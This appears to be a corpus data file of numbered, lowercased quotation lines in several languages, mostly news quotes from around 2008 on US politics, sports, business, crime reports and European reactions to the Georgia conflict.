7548403 por eso entendemos que el gobierno quiera impulsar la tipificaci n penal de las agresiones que sufran los profesionales de la prensa en el cumplimiento de sus labores informativas a la luz de diversas situaciones que han vivido los colegas en el ltimo tiempo como el caso del fot grafo de efe v ctor salas quien result herido en el ojo derecho al ser agredido meses atr s por un agente antidisturbios de carabineros

7548412 in exceedingly competitive markets under tight schedule and budget constraints medical device capital equipment manufacturers and aerospace companies must maintain a high level of quality while meeting performance reliability and safety demands unfortunately the traditional software and product test approaches often associated with their product development efforts is inherently time consuming and accounts for a significant portion of a products development schedule and budget

7548425 under this agreement petrohunter expects to receive approximately 64 25 million subject to falcon exercising its option on our buckskin properties importantly it will help resolve our liquidity problem and transform petrohunter energy corporation into a viable company with a solid future which has been our goal for the past year
7548426 after we completed the sale of our southern piceance properties to laramie energy in may of this year we significantly improved our balance sheet but we still needed working capital to execute our drilling and development plans the falcon transaction will enable petrohunter to become current on all of its trade obligations restructure the amount owed to our senior lender move forward on completing our five buckskin wells and finance further drilling and development on this 20 000 acre project including construction of the gathering system and related facilities
7548427 we also welcome falcons participation with us in australia where weve identified multiple prospects
7548428 i firmly believe the key to improving quality is having nurses at the bedside our current practice has created diversions that pull nurses from consistent bedside nursing
7548429 i was thrilled to learn about vhas rapid adoption network our participation in this initiative has opened a door of networking for our staff that is invaluable
7548430 vhas clinical improvement platform focuses on helping members become leading performers
7548431 our programs and services will help guide members towards success and improve clinical care across the country
7548432 hospitals are working hard to improve the quality and safety of their nursing care return to care is one critical strategy to help them do so
7548433 by focusing on nursing issues we are having an immediate impact on the quality of care that is delivered to all patients
7548434 we are progressively replacing tapes with files in the future employees at our various subsidiaries and locations will be able to access and process the same material simultaneously technical quality control will then be largely automated
7548435 ibm is helping us to make our work process faster and cheaper

7548441 j hrlich werden in deutschland knapp 40 000 diabetes bedingte amputationen vorgenommen nur die h lfte ist jedoch wirklich notwendig
7548442 in einigen f llen wird bereits nach einem jahr bei diabetespatienten ein fu amputiert obwohl mit etwas geduld und einsatz dieser durchaus zu retten w re
7548443 oftmals k mmern sich in den kliniken internisten um diabetiker die nicht immer das absolute fachwissen um die komplexit t der thematik haben
7548444 einige rzte sind einfach zu ungeduldig und k nnen den heilungsprozess nicht abwarten das ist ein ernsthaftes problem
7548445 der grund daf r d rfte sein dass eine amputation f r die betroffenen der anfang vom ende ist und sie sich innerlich aufgeben
7548446 durch die amputationen sind die patienten nicht mehr in der lage alleine f r sich zu sorgen und landen in der vielzahl in pflegeheimen
7548447 da kann doch kaum noch von einer erleichterung f r die patienten gesprochen werden
7548448 das problem bei diabetikern ist dass sie oftmals gar nicht mitbekommen dass sie eine wunde haben
7548449 dann reicht schon ein nicht bemerktes taschentuch im schuh aus dass sich eine blase unter dem fu bildet und diese kann sich bei nichtbehandlung entz nden

7548456 how can tna put that plastic bimbo in charge of us everyone knows that shes all jealous of angelina and i because we are way hotter than she could ever be
7548457 well traci and i havent always been on the same page
7548458 but ive known that girl for a long time and i know that she respects our division as much as i do she definitely cares about giving female athletes a real chance to succeed in tna and i am confident that she has what it takes to keep things nice and fair around here
7548459 look i see nothing wrong with allowing our superstars to cross over to other areas of our company if they are qualified to do so
7548460 ive had similar opportunities throughout my career and i wont hold anyone back from proving themselves in new ways heck matt morgan was always going to be a force in a tna ring but he wanted to establish himself here by using his mind he had the skills and experience that i needed in an assistant so i had no problem with that eventually he got restless and wanted to get his hands dirty so i pushed him out of the office and into the ring if traci ends up feeling the same way then we can end this little experiment at any time until then i remain thoroughly convinced that she has the ability and know how to bring some much need order to the knockouts division
7548461 shes a hell of a lot nicer to look at than earl hebner
7548462 im dr michael seidman director of product research and development for visalus sciences over 20 years ago i recognized that most nutritional supplements just arent made with enough of the right kinds of vitamins and minerals to protect our bodies from the effects of aging contemporary diets hectic lifestyles and a polluted environment ive devoted years of in depth study and documented clinical research to precisely understand what our bodies really need from vitamin supplements the result is visalus sciences scientifically formulated and clinically tested nutritional supplements created by really adhering to what our bodies are telling us we need for a healthier better quality life

7548464 the state has no business in the bedrooms of the nation
7548465 the ministry of unity exercised by the bishop of rome
7548466 i found my identity as a christian by reconciling within myself the faith of my origins and the mystery of the catholic faith without breaking communion with anyone
7548467 i would like to remember the great pioneer of unity bro roger schutz who was so tragically snatched from life i had known him personally for a long time and had a cordial friendship with him
7548468 he often came to visit me and as i already said in rome on the day of his assassination i received a letter from him that moved my heart because in it he underlined his adherence to my path and announced to me that he wanted to come and see me
7548469 i see good reason in this context for optimism in the fact that today a kind of network of spiritual links is developing between catholics and christians from the different churches and ecclesial communities each individual commits himself to prayer to the examination of his own life to the purification of memory to the openness of charity
7548470 the father of spiritual ecumenism paul couturier spoke in this regard of an invisible cloister which unites within its walls those souls inflamed with love for christ and his church i am convinced that if more and more people unite themselves interiorly to the lords prayer that all may be one jn 17 21 then this prayer made in the name of jesus will not go unheard
7548471 en t rminos desestacionalizados la actividad aument un 1 8 por ciento respecto del primer trimestre del a o en tanto la tendencia ciclo anualizada registr una variaci n de 5 5 por ciento

7548473 so the fact is that we have homes and im grateful for it ill continue to say i am blessed and very proud that jim hensley a war hero a man who barely graduated from high school was able to pass on to his daughter what he struggled for and saved for thats the ambition that all of us have for our children and grandchildren if someone wants to disparage that they are free to do that
7548474 examines the roots of the hensley fortune and john mccains implacable bond to the liquor industry how it has enriched him personally and as a politician and how those ties have dictated his actions on questions of public policy the hensley saga meanwhile swirls with bygone accounts of illicit booze gambling horse racing deceit and crime james hensley embarked on his road to riches as a bootlegger a 1948 federal criminal indictment charged the hensleys made approximately 1 284 false entries related to the sale of thousands of cases of liquor by their two companies united sales company in phoenix and united distributors in tucson
7548475 make sure youre very gracious to the people who come here you want to make them as comfortable as possible
7548476 there are tons of radio and tv shows around the country and of course many national shows
7548477 many liberal and conservative hosts broadcast from the same large rooms
7548478 its inspiring to be here to be part of history and to meet other kids who share my passion for politics
7548479 playing in the u s amateur open was a great experience and unfortunately i fell just short
7548480 theres always room for improvement though and you can never be too good at golf so im just going to keep working and hopefully things will progress from there
7548481 the beauty of newcomers is their energy level they really bring a lot of energy a lot of enthusiasm
7548482 the beauty of the upperclassmen is they can look out for the young ones
7548483 the month of august means school bells will soon be ringing ring in big savings on jeans athletic shoes and backpacks the j c penney sale helping students get to the head of the class
7548484 have quite a few paychecks and can buy things gradually
7548485 what the internet can do that those others things cant is it can extend a political handshake across the country and across time zones
7548486 i think that is reflecting their appeal to a younger internet savvy more intensive web user
7548487 they propelled iowa candidates barack obama and mike huckabee to victory
7548488 the youth group is still one of the smallest demographics with the lowest turnout but they have more room to grow theres lots of potential
7548489 we want to create a tradition here but before we can create a tradition we want to make sure we have the right culture
7548490 and we want to be closer to putting all the right pieces into the program
7548491 the level that weve played at has not been good enough to win in the big east no one in this ball club is happy about losing or content or using building a culture as a crutch
7548492 i am completely aware of one and two wins in the last two seasons but i look at the young men were bringing in and the young men that are in our program and i can be honest and proud of what they are accomplishing
7548493 no but my sister is she lives in mccormick you should try to meet her
7548494 we should have probably gone on a good five mile run beforehand and then come back and say ok lets play
7548495 when you want something really badly youre just so gung ho about it not that we had stage fright but we just forgot a little bit of what we were supposed to be doing
7548496 basically i just got the ball from out wide and nobody stepped in front of me
7548497 i just cracked it and it went in we didnt really take that many shots and i just thought it was an opportunity
7548498 the change at halftime was maybe as much about getting some experience in there and settling the team down as we have two quality goalkeepers
7548499 its probably something well take game by game next time around maybe for natalie its better to not start and start chelsey and see how the game goes and make a change
7548500 hes a fighter and one of the toughest ive ever known
7548501 ive been involved in well over 100 campaigns for governors and representatives and hes by far the hardest working and most determined politician ive ever seen in my life
7548502 he is very proud of his family and his familys heritage
7548503 he has a strong sense of history and always read a lot of history books
7548504 he was very social very intelligent and a very engaging person
7548505 he had a lot of natural leadership abilities and political skills
7548506 my whole campaign is about young people because its about the future
7548507 the earlier young people get involved to have your opinions heard the better it will be because youll be a part of making this election happen
7548508 i hope that youll look hard at each of the candidates running and learn about where we stand and what we want to do
7548509 i want to help create universal health care so that everybody in america has quality affordable health care
7548510 but i also believe my own personal theology that works without faith is too hard
7548511 if you take your faith seriously you should look for ways every day that you can be of service
7548512 i have a proven record of producing positive results for people
7548513 i thought it was going to be a boring day today
7548514 its not about speeches for me its not about the bright lights and cameras its about the changes we can make that can actually deliver results in peoples lives
7548515 change is going to happen the question is are we going to get the right kind of change because what im interested in is not just change for the sake of change but progress
7548516 the most important thing that we can do right now is to re engage the american people in the process of government to get them excited and interested again
7548517 what our leaders say matters because the american people need to trust that were saying what we mean that were meaning what we say
7548518 all of us should be in the solutions business but all too often it ends up being business as usual
7548519 i will not allow the democrats to have a single state
7548520 we will compete here in the heartland of america i will compete in the state of wisconsin and we will carry the state of wisconsin
7548521 they want to raise taxes i want to lower taxes they want bigger government i want smaller government they want to have the government take over the health care system in america i want american families to decide
7548522 there is not one senator in the united states senate today yesterday or for the last 25 years that has stood the course more on spending than john mccain
7548523 theyre slowly going to turn to him and this night is a good jumping off point
7548524 penalizes people in their productivity it chokes the life out of them
7548525 for those who really are trying really hard to make their businesses work they spend a lot of their time as well as a lot of their money complying with a tax code that nobody can understand including the internal revenue service
7548526 if youre going to create a system of rules and the rules perhaps create a scenario where you pick the nominee at the convention then either play by the rules or dont have them
7548527 thats what i really fear that were getting to is that now people are saying the game isnt turning out like we wanted so were going to change the rules in the middle of the game and go ahead and just name somebody the winner thats not how we play the game
7548528 you measure the character of an individual not by what they do when everybodys looking when the spotlights are on and you decide you want to be the leader of the free world
7548529 the measure is determined by what people do over their lifetime the choices they make when theyre working in the shadows
7548530 these are tough times now and theyre hurting the government should act quickly and decisively
7548531 the best way to be informed is not to stay within the beltway so people can understand me and i can understand their hopes and visions for america
7548532 this is about half the delegates decided in one day
7548533 this race is coming down to gender versus race whos hip versus whos square and its kind of pathetic
7548534 the audacity of deception barack obama u s political culture and the manufacture of progressive illusion
7548535 republicans didnt pick a candidate like bush theyve picked one who doesnt have a strong appeal to the right but instead with independents
7548536 obama has an appeal to very young voters who have never voted before not necessarily independents
7548537 i would not have done it just because he was my friend had we not worked together in a successful bipartisan way
7548538 i want to help people who strive to come to america get to america
7548539 if i am able to help people in the same way that my parents were helped than that would be the most gratifying thing in the world for me
7548540 a lot of people are starting their own law practice in immigration law because of the steady stream of clients
7548541 the unfortunate thing is that a lot of these clients are not very well off and sometimes even get deported which makes it difficult to get paid
7548542 i just got back from studying abroad in ireland so i got to see all my friends again in milwaukee i also went to lollapalooza in chicago and saw radiohead
7548543 i interned with the brewers i got to meet the players go to batting practice go on the field and talk to the managers in the clubhouse
7548544 i went to california for a few weeks to visit family it was nice to take a vacation
7548545 what are you looking forward to most about this year
7548546 im excited about finally being an upper classman and living in an apartment with my friends im happy to finally have people back here so that im not alone all the time
7548547 im really excited to go to london im studying abroad first semester and i cant wait
7548548 when we were little he always wanted to be a veterinarian
7548549 a vote for ron paul is still a strong statement that you dont support where the republican party is heading and that there needs to be a change
7548550 im not even worried about that im just happy i won
7548551 we just heard about it and decided to come down
7548552 the presidency is not something that lends itself to on the job training
7548553 those cities we felt were so obvious and so overdone
7548554 we were really striving to defy expectations on many levels
7548555 nascar tailgaters lebanese dabka dance fans and foo fighter freaks are all welcome
7548556 when i go out i dont really see a huge amount of sexiness
7548557 it wasnt that long ago that we were the fattest city in the country
7548558 and we have our own self hating issues but it was funny to see people get all hot and bothered by being perceived as sexy
7548559 all through the summer as soon as we left school every day youd go to your computer and youd have at least 10 e mails from the team
7548560 every day wed have someone or multiple people saying i did this today or i ran this or i did this workout it started right away
7548561 you can only gain from the experience youve had in the past
7548562 we now understand that every time we come out you have to give everything you have we had a couple of games last year end in ties even though we dominated those teams you can talk about giving everything you can teach it but it kind of has to come there has to be an urgency to it
7548563 probably the deepest group from top to bottom weve ever had
7548564 we have talent we have depth we have senior leadership we have older upperclassmen leadership we have young players that have adjusted very well and will contribute
7548565 strength in numbers is definitely something we have to rely on game in and game out
7548566 we had 12 seniors last year it was a little bit harder to lead with that many people trying to take the leadership role
7548567 so since theres technically only three graduating seniors on the team this year i feel like that will be a strength we can really bring the team together
7548568 i think the provost is the person who enables other people to have visions and dreams
7548569 i really hope that im the person who enables faculty and deans and students to figure out how to make those dreams into reality
7548570 all volunteers pay out of pocket for their driving costs
7548571 and as the costs continue to climb upward they grow increasingly problematic
7548572 they call reagan the great communicator but i think mike is as great if not greater than reagan or lincoln
7548573 its not done until its done and the discussions are really ongoing and ongoing and ongoing but hopefully drawing to a conclusion
7548574 there are a lot of details that have to be worked out
7548575 i am glad that the administration has finally shifted to accepting a timetable for the removal of our combat troops from iraq
7548576 senator mccain has stubbornly focused on maintaining an indefinite u s presence in iraq but events have made his bluster and record increasingly out of touch with reality
7548577 it keeps going down so for our boats everything takes a lot longer
7548578 on the positive side more stuff is exposed for us to get so i guess it works both ways
7548579 its the roofs the trusses the 2x4s the electrical box and electrical wires and the structure itself
7548580 it gets caught up in a log jam so its all mangled
7548581 its kind of all held together by the internal wiring and board by board piece by piece piece of carpet or whatever it is we load up the boats one by one
7548582 we really need all the water we can get whether its rain or water from the upper reservoirs
7548583 we need rain but we dont need 14 inches in two days or something like that
7548584 its kind of weird to pick up pieces of peoples lives
7548585 wow i have electronics stuck to my wall just like tony stark
7548586 we are all responsible for making the process transparent and unbiased
7548587 but we have to balance that with the convenience and peoples ability to participate easily in the process
7548588 parties want to have their candidate chosen as soon as possible
7548589 parties want to have a unified message and start looking toward the general election in november
7548590 giuliani will be looking toward florida huckabee will campaign hard in the south and mccain feels good about south carolina
7548591 michigan will be very important for romney because he needs a victory
7548592 each candidate could have some momentum in the coming weeks
7548593 i wont be surprised if this goes on for a while
7548594 his strategy is that the other two will go nuclear on each other and hell be the person left standing its a long shot strategy but its really all he has
7548595 a good core of sen obamas support came from independent voters who were allowed to participate in iowa and new hampshire
7548596 as we move into closed states sen obama wont have that luxury
7548597 there wont be an obvious winner until the delegates are chosen
7548598 whats little noted is that clinton has 2 to 1 lead over obama in terms of pledged delegates
7548599 if super tuesday is competitive then i believe that primaries will be competitive at later dates
7548600 this is the year for the late primaries voters in states holding late primaries can hold out hope
7548601 there are interesting regional cross sections voting on super tuesday whether they are urban centers or rural areas
7548602 the results are most likely going to differ for each candidate because they have differing results in certain demographics
7548603 the presidential election process is prompting voters to pay more attention now and we have a number of local contest that will encourage voters to come next week too
7548604 youll never take the politics out of a supreme court election
7548605 this is all done without any vote by the legislature
7548606 if you look at past elections none of the democrats have done well against walker
7548607 i think tom barrett hasnt had to spend any of his campaign fund
7548608 its just not clear why an assembly person would run for a low profile city attorney position
7548609 barack obama is the best candidate to bring about the change america wants
7548610 his powerful message of hope over cynicism and unity over division is exactly what our country needs
7548611 weve won some of the biggest states in the country
7548612 i look forward to continuing our campaign and our debate about how to leave this country better off for the next generation
7548613 our time has come our movement is real and change is coming to america
7548614 the one way you cant win a race is to quit it and until somebody beats me im going to answer the bell for every round of this fight
7548615 were going to go all the way to the convention were going to win this thing
7548616 it is time for a fan driven ticket site that was truly created with the needs of the fans both buyers and sellers in mind
7548617 by offering a platform that quickly and efficiently connects buyers and sellers based on location and does not attach inflated fees for either party livestub will help grow the secondary ticket market amongst the general public
7548618 hunting is used as a management tool in wisconsin it is used as a last resort to control populations

7548620 to sit and watch this be destroyed is difficult to take

7548624 i spent 22 years in the navy my grandfather was in the navy we in the military service tend to move a lot we have to live in all parts of the country all parts of the world i wish i could have had the luxury like you of growing up and living and spending my entire life in a nice place like the first district of arizona but i was doing other things
7548625 as a matter of fact when i think about it now the place i lived longest in my life was hanoi

7548659 mafia che si presa gioco delle regole del comitato olimpico sottraendo medaglie a cuba
7548660 totale solidariet allatleta campione olimpico 8 anni fa la cui madre morta mentre lui gareggiava e vinceva loro a 20 mila chilometri dalla sua patria deluso per una decisione che gli sembrava totalmente ingiusta ha protestato con larbitro inoltre avevano cercato di comprare il suo allenatore non ha potuto trattenersi larbitro ha sospeso il combattimento quando stava vincendo 3 2 molto grande il potere dei giudici in queste competizioni mentre gli atleti non ne hanno nessuno
7548661 ho visto quando i giudici hanno rubato i combattimenti a due pugili cubani in semifinale avevano speranza di vincere nonostante i giudici ma stato tutto inutile perch erano condannati in partenza
7548662 non sono obbligato a stare zitto davanti alla mafia scrive castro che si organizzata per prendersi gioco delle regole del comitato olimpico e stato criminale quello che hanno fatto ai giovani della nostra squadra di boxe per completare il lavoro di quelli che si dedicano a rubare atleti del terzo mondo lasciando cuba senza una sola medaglia doro in questa disciplina cuba non ha mai comprato un atleta o un arbitro ci sono sport nei quali gli arbitri sono molto corrotti e i nostri atleti devono combattere sia contro lavversario che contro larbitro
7548663 la loro condotta stata esemplare continua castro hanno sconfitto due volte gli stati uniti il paese che ha inventato questo sport che per interesse delle grandi aziende commerciali stato espulso dalle olimpiadi

7548705 the samsung nv24hd is a great digital camera with everything all under one roof great design outstanding performance good value for money and ease of use what more could you want
7548706 image quality is regrettably where the samsung lets us down its not terrible by any means but its not all that great either as well see below the sony simply beats it hands down at all isos and even the nv24s hd video capability cant make up for this
7548707 whats hot hd video recording stylish design low chromatic aberration unusual but cool controls
7548708 this is an amazing camera i absolutely love it so compact and sleek plus hd i went to disney world and used this camera through out the whole trip
7548709 i have found the camera difficult to set difficult to use and ive been unable to download pictures from the sd card unless i put the card in my canon camera which works fine i loaded the samsung master software into two pcs running windows vista neither computer recognized the camera
7548710 im a professional videographer and i think this is a really special item i bought it for the hd video features i was able to edit the video on premiere pro cs3 ive only had it for a day but i put it through a few tests i was surprised by how good the video quality is and the colors looked great
7548711 this camera is absolutely wonderful after shopping around and looking at cameras for what seemed like forever i finally found this little wonder now people may be hesitant as to the samsung brand i was too but i am in love with this camera
7548712 love the smart buttons gives you the feel of a touch screen without touching the screen love the wide angle as well
7548713 im glad i did not read the poor reviews amazon before i bought my nv24hd instead i relied on the mfr specs and bought it this is a great camera anyone who says less does not understand modern technology
7548714 when samsung launched the nv series in 2006 our goal was to create a family of digital cameras that would redefine the digital imaging industry
7548715 we took our r amp d and engineering to a whole new level and the result was groundbreaking that same level of dedication is evident in our newly introduced nv digital cameras especially with the nv24 hd our design engineers rose to the challenge of developing a digital camera to compliment the high definition lifestyle of todays consumer and im proud to call that camera the most advanced point and shoot camera in samsungs history

7549040 chiar daca negocierile se reiau o transnistrie plina de incredere si sustinuta de rusia i ar putea cere presedintelui voronin un pret care il depaseste pe cel pe care l ar putea plati in mod normal si justificabil pentru mostenirea adica solutionarea conflictului lasata de el inainte de finalul celui de al doilea mandat
7549041 decat sa pretinda asa cum au facut ca situatia din kosovo nu creeaza un precedent liderii celor 27 de state ue trebuie sa fie expliciti ce fel de precedent creeaza de fapt
7549042 toate initiativele sunt la nivel declarativ cand e sa treaca la actiune nu o fac
7549043 nu a fost o reactie intarziata a presedintelui basescu mai mult el a fost unul dintre putinii presedinti ai statelor ue care a avut initiativa de a merge nu numai in georgia ci si in moldova ucraina azerbaidjan si turcia un gest inspirat a fost acela de a merge si in ucraina si in moldova intrucat exista temeri ca ucraina ar putea fi urmatoarea victima a rusiei instinctul lui basescu privind aceasta vizita a fost foarte bun
7549044 romania este un stat mediu din ue ca marime este un stat nou are o influenta redusa nu este integrata in spatiul schengen si in zona euro au fost probleme inainte de aderare are inca probleme cu coruptia inca nu si a facut toate temele fata de ue romania nu este un stat total integrat in proiectul european si nu trebuie sa exageram cu asteptarile privind rolul pe care il poate juca
7549045 in primele doua luni impactul politic regional nu este foarte clar iar romania in acest context incearca sa se pozitioneze sa elaboreze o pozitie referitor la cele intamplate presedintele roman este unul dintre putinii lideri ue care a vizitat regiunea de conflict si vecinii iar el trebuie sa fie foarte activ in perioada urmatoare in promovarea regiunii marii negre
7549046 este necesara restructurarea fortelor pacificatoare ca sa raspunda la intrebarile si la necesitatea asigurarii acelor acorduri care sunt intre statele respective unde activeaza aceste forte mai ales in conditiile de conflict
7549047 principala diferenta vine din partea rusiei care dupa succesul militar din georgia se simte mai ambitioasa crede ca a reusit sa si atinga obiectivele si va folosi orice mijloace inclusiv pe cel militar sa si le atinga in continuare in georgia raspunsul occidentului nu a fost foarte convingator si atunci rusia isi spune ca poate cere mult mai mult si poate fi mult mai ambitioasa in statele ex sovietice iar occidentul nu va fi eficient sa o impiedice asa ca trebuie sa ne asteptam la o pozitie mai dura a transnitriei in negocierile cu republica moldova daca vor fi reluate rusia nu a fost dispusa inainte sa si retraga trupele din transnitria si acum va insista pentru mentinerea lor cu atat mai mult
7549048 logica comerciala nu este suficient de convingatoare nu stiu in ce masura ceea ce s a intamplat in georgia va avea efecte asupra calculelor economice
7549049 razboiul creeaza o noua dinamica si deocamdata nu stim directia in care merge ea nici din punct de vedere politic nici in ceea ce priveste nabucco este clar ca majoritatea statelor din regiune sunt speriate de rusia reactia occidentului va defini in mare parte daca aceste state vor continua sa coopereze cu vestul si in ce masura dupa georgia neimplicarea occidentului va transmite un semnal furnizorilor de gaz din caucaz ca nu este dispus sa isi modeleze prezenta in regiune iar pe termen scurt este nevoie de o prezenta foarte substantiala in georgia misiune militara dar si una civila mai mare de reconstructie
7549050 presedintia franceza a ue pare destul de decisa si trebuie suprapuse discutiile despre georgia pe tendintele mai largi franta a promovat la inceputul presedintiei ei o politica de securitate si aparare mai integrata iar georgia este un test pentru ea
7549051 este pe de o parte dorinta de a avea o uniune europeana mai puternica in relatiile internationale si pe de alta parte reticenta fata de est neimplicarea ue in georgia ii va submina drastic sansele de a juca rolul international pe care si l doreste
7549052 exact ideea asta ca germania nu vrea sa supere rusia jucand un rol mai pregnant in europa de est si in caucazul de sud a creat conditiile pentru georgia si pentru rusia care au dus la escaladarea situatiei
7549053 asa numita dependenta este o fictiune prishologica cele mai mari state ue cu consumul energetic cel mai mare au surse diversificate in germania de exemplu gazul rusesc reprezinta 45 din importurile totale de gaz statele care intr adevar depind de gazul rusesc sunt cele baltice finlanda si oarecum ungaria dar ele sunt economii foarte mici care consuma foarte putin gaz si care pot inlocui gazul in 10 15 ani cu surse alternative in finlanda care foloseste 100 gazul rusesc de import acesta reprezinta de fapt doar 25 din necesarul total de energie din aceasta tara la nivelul ue gazul rusesc acopera doar 6 5 din necesarul total energetic iar uniunea devine din ce in ce mai putin dependenta de el daca acum 5 10 ani acesta reprezenta 50 din importurile europene de gaz acum doar 40 este importat de la rusi
7549054 exista radacini istorice foarte adanci reticenta foarte clara de a irita rusia s a regasit si in anii 50 60 cand social democratii din germania de vest au avut aceeasi atitudine iar acum vicecancelarul steinmeier frank walter steinmeier si ministru de externe are aceeasi atitudine gazul rusesc este relativ ieftin si realtiv accesibil dar dorinta germaniei de a beneficia de el nu trebuie sa explice paralizia cvasitotala in modul de a trata rusia

7549070 too uncomfortable for me to tell someone else to give up on their dream
7549071 its the 1959 season at crosley field in cincinnati the reds hosting the eventual national league champion los angeles dodgers first baseman norm larker is at bat for the visitors righthander bob mabe is on the mound located at the corner of findlay and western in the citys west end this is a colorful and cozy ballpark less than 400 feet to any outfield fence and there are no warning tracks just rising inclines to alert players of imminent contact with a wall first opened in 1912 as redland field and renamed in 1934 for team owner powell crosley it was the site of the first night game in major league history may 24 1935 with riverfront stadium ready for occupancy the reds played their final game here on june 24 1970
7549072 its the summer of 53 in washington dc steamy hot as usual the senators entertaining the boston red sox mickey vernon is at bat for washington hell go on to lead the american league in batting 337 and doubles 43 but the senators will finish well off the pace in the american league also as usual although it was a small ballpark its capacity never exceeded 30 000 the dimensions of the playing field made griffith a pitchers dream in 1953 the distance from home plate to the left field foul pole was a mere 405 feet it was 421 feet to straightaway center and 320 feet down the rightfield line the entire right side of the outfield was protected by a 30 foot high wall similar to fenways green monster
7549073 its may 2 1954 in st louis a doubleheader between the cardinals and the visiting new york giants st louis slugger stan musial is in the midst of a monster afternoon here in the eighth inning of the opener stan the man has just launched his third homer of the game and third of five for the day wally moon on second and red schoendienst on first will score ahead of musial who had six rbis in the opener and three in the nightcap jim hearn is the giants pitcher wes westrum is catching whitey lockman is at first davey williams at second al dark at short hank thompson at third monte irvin in left willie mays in center and don mueller in right from your elevated perch behind home plate youre looking out at the budweiser scoreboard in left the ymca building beyond the wall in center and the familiar pavilion in right
7549074 its june 8 1950 at bostons fenway park and the red sox are heading toward one of the great blowouts in baseball history a 29 4 romp past the st louis browns these 50 red sox won 94 games but still finished in third place in the american league four games behind the pennant winning yankees walt dropo bobby doerr vern stephens dom dimaggio and ted williams fueled a potent red sox offense

7549083 what nbc chooses to broadcast is not the olympic games they offer selected clips of selected american athletes largely in major sports sometimes hours after the event whereas if the bruised olympic ideal still means anything it means loosing yourself for a couple of weeks from the bonds of your immediate loyalties and tastes
7549084 to be competitive sellers need to find an experienced agent that understands what it takes to attract buyers in todays real estate market
7549085 i advise my sellers to follow these six simple rules
7549086 we are lucky to have someone of karens background and expertise on board
7549087 karen is a perfect fit for the community and exemplifies the companys high standards of professionalism and dedication to customer service
7549088 unfortunately the expenses associated with medical treatment along with loss of income during that period of time are simply too much of a financial hurdle at this point liquidating the domain name portfolio and using the proceeds to pay for medical and living expenses is the most responsible way for us to manage an unfortunate set of circumstances
7549089 our strategy combines the use of youtube style videos audio testimonials and blogging tools as a more effective way to communicate with prospective clients and customers
7549090 one problem with most of todays industry standard websites is that theyre static and provide text based content with a photo or two prospective buyers want more than whats written about a dentist or attorney on their website they want to see and hear them in action they want to hear what other patients and clients have to say about their experiences most people are using the internet to do initial research before they take the time to meet face to face with a service professional and online audio video is one of the best ways for a service provider to make that initial connection
7549091 we are on the leading edge of changes in the industry unfortunately you dont get to choose when something like this is going to happen
7549092 this comprehensive portfolio is the perfect compliment to other types of marketing services including search engine optimization website design and development or even traditional advertising and promotion for a progressive company who is looking to differentiate themselves from their competitors and provide additional value to their customers these domain names will provide a great return on investment to a buyer who recognizes the power of the internet
7549093 we are currently accepting offers from potential buyers and plan to complete a sale sometime in the next couple of months then once we get through the surgery and treatment later this year well move forward and make the most of the opportunities we have at that point

7549111 hilllary has done more than any runner up in the history of the democratic party to support and campaign for the nominee since her concession
7549112 by encouraging senator clintons name to be placed in nomination senator obama has shown real respect for her and her supporters
7549113 is still work to do on the bill clinton front he feels like the obama campaign ran against and systematically dismissed his administrations accomplishments and he feels like he was painted as a racist during the primary process
7549114 senator obama would go a long way towards healing these wounds if he were to specifically praise the accomplishments of the clinton presidency in a line or two during his speech on thursday
7549115 he could thank president clinton for all of the work he did throughout his life to bridge the divides in our country

7549147 an 18 month old boy is in a critical condition in hospital with a serious head injury after what appears to be a tragic accident yesterday afternoon at the youngsters home in birmingham
7549148 the toddler was playing with other young children in the garden of his home in the washwood heath area when he sustained a pellet wound to the back of the head from an air weapon
7549149 a strong line of inquiry is that young children aged under five somehow managed to access the air weapon and accidentally caused it to go off
7549150 while we are still trying to establish precisely what happened this does appear to be a tragic accident involving young children
7549151 following a number of reports from witnesses so far the police are treating this as suspicious and a 21 year old man has been arrested on suspicion of murder in connection with the death of the 21 year old woman and is currently being questioned by police
7549152 it is not clear how the pair have entered the water and we are appealing for anyone who may have seen the couple on middle walk or in the area at around 2 30am to come forward
7549153 at this stage there is no indication to suggest that knives or weapons were involved but we believe this group came to the tower block for a specific purpose
7549154 for reasons which we continue to investigate this caused ahmed and his friends to leave the flats
7549155 ahmed was separated from his friends and climbed on to the outside of the tower block via an open balcony and then climbed down several floors trying to escape he reached the seventh floor when he could no longer carry on and he lost his grip
7549156 after this point he fell to his death there is no indication that ahmed was assaulted before he fell
7549157 having recovered cctv evidence it is apparent that after ahmed fell five of the six youths left the area they were seen riding on pedal cycles along paragon road away from mare street
7549158 one of the male youths left the area on foot leaving his bicycle at the scene police have recovered this and it is being forensically examined
7549159 we are very pleased to be intimately involved in the stop the hate program
7549160 the curriculum is challenging engaging and gives educators the tools they need to make a real difference on our college campuses in the 10 years since matts murder programs like stop the hate have made our college campuses safer places to learn and work
7549161 it is clear that hate is alive in this country bias motivated violence is on the rise and stop the hate does not want to forget our past victims and their loved ones as we look toward creating a future of tolerance and acceptance
7549162 as we mark this 10 year observance stop the hate is working even harder to give colleges the necessary tools to not only respond to bias and hate when it happens but to prevent it to stop it
7549163 at the end of the secondary school english language programme the students should be able to read and understand prose and poetry for information and enjoyment
7549164 in the name of all the competitors except those fruity figure skaters i promise that we shall take part in these olympic games respecting and abiding by the rules which govern them committing ourselves to a sport without doping and without drugs in the true spirit of sportsmanship like gordie howe there was a sportsman for the glory of sport and the honour of our teams but especially canada because doping and breaking the rules is something the french do like diving or wearing face shields
7549165 i personally put our bad start to the season down to the new stadium we dropped some points that any team will drop when they move to a new stadium it is linked with the unfamiliarity as well as the fact that a team that comes to the stadium has no bad memories
7549166 i was very annoyed about the constant announcements i think he has to respect people and not talk too much we are not on the radio here there are people who want to watch a football game without a debate going on its really disturbing i dont know if it puts the players off but for people watching its disturbing you wonder why theres one guy reading a book up there on his own and nobody is interested in what he says
7549167 we drew at wigan on sunday and i was asked about the state of the pitch after the game of course i would have preferred a better pitch because frankly it was a disaster the excuse is that wigan have a rugby team who play on the pitch but having a surface like that is disrespectful for the fans who come and pay money to see the game
7549168 they will be better in two or three more years because they will be even more experienced and they will still be very young then
7549169 if celtic dont want me they should let me know
7549170 hopefully its not as bad this time but theyre not going to give any medals out in august or september everybody wishes are that you win every game and it doesnt happen and everybody wishes that you dont get injuries but it happens
7549171 if you arent in over your head how do you know how tall you are
7549172 what i feel is missing from our screens is a channel that encourages adventurism and experimentation backed by money
7549173 a channel that becomes home of the best programme makers the best writers the best directors and most visionary producers and format creators a channel that becomes a brand for what is new and surprising but not compromised by the pressures of advertising or too tightly targeted an audience
7549174 uninhibited by the need to placate advertisers the subscription networks have been given the opportunity to experiment but on a big rather than timid scale
7549175 whatever the bbc says and does it will get it in the neck
